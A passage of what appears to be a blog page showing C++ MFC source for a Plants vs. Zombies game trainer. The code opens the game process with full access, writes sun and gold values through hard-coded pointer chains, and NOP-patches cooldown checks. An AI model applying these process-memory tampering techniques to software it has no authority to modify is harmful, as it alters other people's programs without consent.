class=\"line\">898</span><br><span class=\"line\">899</span><br><span class=\"line\">900</span><br><span class=\"line\">901</span><br><span class=\"line\">902</span><br><span class=\"line\">903</span><br><span class=\"line\">904</span><br><span class=\"line\">905</span><br><span class=\"line\">906</span><br><span class=\"line\">907</span><br><span class=\"line\">908</span><br><span class=\"line\">909</span><br><span class=\"line\">910</span><br><span class=\"line\">911</span><br><span class=\"line\">912</span><br><span class=\"line\">913</span><br><span class=\"line\">914</span><br><span class=\"line\">915</span><br><span class=\"line\">916</span><br><span class=\"line\">917</span><br><span class=\"line\">918</span><br><span class=\"line\">919</span><br><span class=\"line\">920</span><br><span class=\"line\">921</span><br><span class=\"line\">922</span><br><span class=\"line\">923</span><br><span class=\"line\">924</span><br><span class=\"line\">925</span><br><span class=\"line\">926</span><br><span class=\"line\">927</span><br><span class=\"line\">928</span><br><span class=\"line\">929</span><br><span class=\"line\">930</span><br><span class=\"line\">931</span><br><span class=\"line\">932</span><br><span class=\"line\">933</span><br><span class=\"line\">934</span><br><span class=\"line\">935</span><br><span class=\"line\">936</span><br><span class=\"line\">937</span><br><span class=\"line\">938</span><br><span class=\"line\">939</span><br><span class=\"line\">940</span><br><span class=\"line\">941</span><br><span class=\"line\">942</span><br><span class=\"line\">943</span><br><span class=\"line\">944</span><br><span class=\"line\">945</span><br><span class=\"line\">946</span><br><span class=\"line\">947</span><br><span class=\"line\">948</span><br><span class=\"line\">949</span><br><span class=\"line\">950</span><br><span class=\"line\">951</span><br><span class=\"line\">952</span><br><span class=\"line\">953</span><br><span class=\"line\">954</span><br><span class=\"line\">955</span><br><span class=\"line\">956</span><br><span class=\"line\">957</span><br><span class=\"line\">958</span><br><span class=\"line\">959</span><br><span class=\"line\">960</span><br><span class=\"line\">961</span><br><span class=\"line\">962</span><br><span class=\"line\">963</span><br><span class=\"line\">964</span><br><span class=\"line\">965</span><br><span class=\"line\">966</span><br><span class=\"line\">967</span><br><span class=\"line\">968</span><br><span class=\"line\">969</span><br><span class=\"line\">970</span><br><span class=\"line\">971</span><br><span class=\"line\">972</span><br><span class=\"line\">973</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// plantDlg.cpp : 实现文件</span><br><span class=\"line\">//</span><br><span class=\"line\"></span><br><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &quot;plant.h&quot;</span><br><span class=\"line\">#include &quot;plantDlg.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef _DEBUG</span><br><span class=\"line\">#define new DEBUG_NEW</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// 用于应用程序“关于”菜单项的 CAboutDlg 对话框</span><br><span class=\"line\"></span><br><span class=\"line\">class CAboutDlg : public CDialog</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tCAboutDlg();</span><br><span class=\"line\"></span><br><span class=\"line\">// 对话框数据</span><br><span class=\"line\">\tenum &#123; IDD = IDD_ABOUTBOX &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tprotected:</span><br><span class=\"line\">\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持</span><br><span class=\"line\"></span><br><span class=\"line\">// 实现</span><br><span class=\"line\">protected:</span><br><span class=\"line\">\tDECLARE_MESSAGE_MAP()</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CAboutDlg::DoDataExchange(CDataExchange* pDX)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::DoDataExchange(pDX);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)</span><br><span class=\"line\">END_MESSAGE_MAP()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// CplantDlg 对话框</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CplantDlg::CplantDlg(CWnd* pParent /*=NULL*/)</span><br><span class=\"line\">\t: CDialog(CplantDlg::IDD, pParent)</span><br><span class=\"line\">\t, m_edit_sun(9999)</span><br><span class=\"line\">\t, m_edit_gold(9999)</span><br><span class=\"line\">\t, m_nocd(FALSE)</span><br><span class=\"line\">\t, m_bigmouth_nocd(FALSE)</span><br><span class=\"line\">\t, m_x(0)</span><br><span class=\"line\">\t, m_y(0)</span><br><span class=\"line\">\t, m_noblood(FALSE)</span><br><span class=\"line\">\t, no_run(FALSE)</span><br><span class=\"line\">\t, no_pit(FALSE)</span><br><span class=\"line\">\t, m_nomubei(FALSE)</span><br><span class=\"line\">\t, m_tudou(FALSE)</span><br><span class=\"line\">\t, m_frozen(FALSE)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::DoDataExchange(CDataExchange* pDX)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::DoDataExchange(pDX);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT1, m_edit_sun);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT2, m_edit_gold);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK1, m_nocd);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK2, m_bigmouth_nocd);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT3, m_x);</span><br><span class=\"line\">\tDDX_Text(pDX, IDC_EDIT4, m_y);</span><br><span class=\"line\">\tDDX_Control(pDX, IDC_COMBO1, m_cbPlantsChoose);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK3, m_noblood);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK4, no_run);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK5, no_pit);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK6, m_nomubei);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK7, m_tudou);</span><br><span class=\"line\">\tDDX_Check(pDX, IDC_CHECK8, m_frozen);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BEGIN_MESSAGE_MAP(CplantDlg, CDialog)</span><br><span class=\"line\">\tON_WM_SYSCOMMAND()</span><br><span class=\"line\">\tON_WM_PAINT()</span><br><span class=\"line\">\tON_WM_QUERYDRAGICON()</span><br><span class=\"line\">\t//&#125;&#125;AFX_MSG_MAP</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON1, &amp;CplantDlg::OnBnClickedButton1)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON2, &amp;CplantDlg::OnBnClickedButton2)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON3, &amp;CplantDlg::OnBnClickedButton3)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON4, &amp;CplantDlg::OnBnClickedButton4)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK1, &amp;CplantDlg::OnBnClickedCheck1)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK2, &amp;CplantDlg::OnBnClickedCheck2)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON5, &amp;CplantDlg::OnBnClickedButton5)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON6, &amp;CplantDlg::OnBnClickedButton6)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK3, &amp;CplantDlg::OnBnClickedCheck3)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK4, &amp;CplantDlg::OnBnClickedCheck4)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK5, &amp;CplantDlg::OnBnClickedCheck5)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK6, &amp;CplantDlg::OnBnClickedCheck6)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_BUTTON7, &amp;CplantDlg::OnBnClickedButton7)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK7, &amp;CplantDlg::OnBnClickedCheck7)</span><br><span class=\"line\">\tON_BN_CLICKED(IDC_CHECK8, &amp;CplantDlg::OnBnClickedCheck8)</span><br><span class=\"line\">END_MESSAGE_MAP()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">// CplantDlg 消息处理程序</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL CplantDlg::OnInitDialog()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCDialog::OnInitDialog();</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 将“关于...”菜单项添加到系统菜单中。</span><br><span class=\"line\"></span><br><span class=\"line\">\t// IDM_ABOUTBOX 必须在系统命令范围内。</span><br><span class=\"line\">\tASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX);</span><br><span class=\"line\">\tASSERT(IDM_ABOUTBOX &lt; 0xF000);</span><br><span class=\"line\"></span><br><span class=\"line\">\tenableDebugPriv();</span><br><span class=\"line\"></span><br><span class=\"line\">\tCMenu* pSysMenu = GetSystemMenu(FALSE);</span><br><span class=\"line\">\tif (pSysMenu != NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCString strAboutMenu;</span><br><span class=\"line\">\t\tstrAboutMenu.LoadString(IDS_ABOUTBOX);</span><br><span class=\"line\">\t\tif (!strAboutMenu.IsEmpty())</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpSysMenu-&gt;AppendMenu(MF_SEPARATOR);</span><br><span class=\"line\">\t\t\tpSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动</span><br><span class=\"line\">\t//  执行此操作</span><br><span class=\"line\">\tSetIcon(m_hIcon, TRUE);\t\t\t// 设置大图标</span><br><span class=\"line\">\tSetIcon(m_hIcon, FALSE);\t\t// 设置小图标</span><br><span class=\"line\"></span><br><span class=\"line\">\t// TODO: 在此添加额外的初始化代码</span><br><span class=\"line\">\taddPlantsToCombox();</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn TRUE;  // 除非将焦点设置到控件，否则返回 TRUE</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnSysCommand(UINT nID, LPARAM lParam)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif ((nID &amp; 0xFFF0) == IDM_ABOUTBOX)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCAboutDlg dlgAbout;</span><br><span class=\"line\">\t\tdlgAbout.DoModal();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCDialog::OnSysCommand(nID, lParam);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 如果向对话框添加最小化按钮，则需要下面的代码</span><br><span class=\"line\">//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，</span><br><span class=\"line\">//  这将由框架自动完成。</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnPaint()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (IsIconic())</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCPaintDC dc(this); // 用于绘制的设备上下文</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tSendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// 使图标在工作区矩形中居中</span><br><span class=\"line\">\t\tint cxIcon = GetSystemMetrics(SM_CXICON);</span><br><span class=\"line\">\t\tint cyIcon = GetSystemMetrics(SM_CYICON);</span><br><span class=\"line\">\t\tCRect rect;</span><br><span class=\"line\">\t\tGetClientRect(&amp;rect);</span><br><span class=\"line\">\t\tint x = (rect.Width() - cxIcon + 1) / 2;</span><br><span class=\"line\">\t\tint y = (rect.Height() - cyIcon + 1) / 2;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t// 绘制图标</span><br><span class=\"line\">\t\tdc.DrawIcon(x, y, m_hIcon);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tCDialog::OnPaint();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//当用户拖动最小化窗口时系统调用此函数取得光标</span><br><span class=\"line\">//显示。</span><br><span class=\"line\">HCURSOR CplantDlg::OnQueryDragIcon()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn static_cast&lt;HCURSOR&gt;(m_hIcon);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD CplantDlg::FindGameProcessidByWndTitle(CString strTitle)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDWORD pid = 0;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, strTitle.GetBuffer());   //找到窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未找到指定游戏&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\treturn pid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[6A9EC0]+768]+5560</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x768;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwsun = 99999;</span><br><span class=\"line\">\tdwTemp += 0x5560;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwsun, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[006A9EC0]+82c]+28</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x82c;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwGold = 99999;</span><br><span class=\"line\">\tdwTemp += 0x28;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwGold, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[6A9EC0]+768]+5560</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x768;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwsun = m_edit_sun;</span><br><span class=\"line\">\tdwTemp += 0x5560;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwsun, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedButton4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t// 计算基地址  [[006A9EC0]+82c]+28</span><br><span class=\"line\">\tDWORD dwTemp = 0;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x6A9EC0, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdwTemp += 0x82c;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPVOID)dwTemp, (LPVOID)&amp;dwTemp, sizeof(DWORD), &amp;dwPid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;读取数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDWORD dwGold = m_edit_gold;;</span><br><span class=\"line\">\tdwTemp += 0x28;</span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(dwTemp), &amp;dwGold, sizeof(DWORD), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// 00487296 - 7E 14                 - jle 004872AC  植物cd判断跳转代码</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_nocd)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x7E;</span><br><span class=\"line\">\t\tbuf[1] = 0x14;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x00487296), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CplantDlg::OnBnClickedCheck2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t//00461565 - 75 5F   - jne 004615C6</span><br><span class=\"line\">\tUpdateData(TRUE);</span><br><span class=\"line\">\tDWORD dwPid = FindGameProcessidByWndTitle(_T(&quot;植物大战僵尸中文版&quot;));</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class=\"line\">\tif (!hProcess)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;进程打开失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUCHAR buf[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (m_bigmouth_nocd)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//nop nop</span><br><span class=\"line\">\t\t//禁用cd</span><br><span class=\"line\">\t\tbuf[0] = 0x90;</span><br><span class=\"line\">\t\tbuf[1] = 0x90;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//7e 14 </span><br><span class=\"line\">\t\t//启用cd时间</span><br><span class=\"line\">\t\tbuf[0] = 0x75;</span><br><span class=\"line\">\t\tbuf[1] = 0x5f;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!::WriteProcessMemory(hProcess, (LPVOID)(0x00461565), buf, sizeof(buf), NULL))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;写入数据失败&quot;), NULL, MB_OK);</span><br><span class=\"line\">\t\tCloseHandle(hProcess);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCloseHandle(hProcess);</span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># if 0 </span><br><span class=\"line\">// 裸函数，不需要编译器添加任何代码</span><br><span class=\"line\">__declspec(naked) void putPlant()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpush -1</span><br><span class=\"line\">\t\tpush 2</span><br><span class=\"line\">\t\tmov eax, 4</span><br><span class=\"line\">\t\tpush 4</span><br><span class=\"line\">\t\tmov ebx, ds:[0x6A9EC0]</span><br><span class=\"line\">\t\tmov ebx, ds:[ebx + 0x768]</span><br><span class=\"line\">\t\tpush ebx</span><br><span class=\"line\">\t\tmov edx, 0x40D120</span><br><span 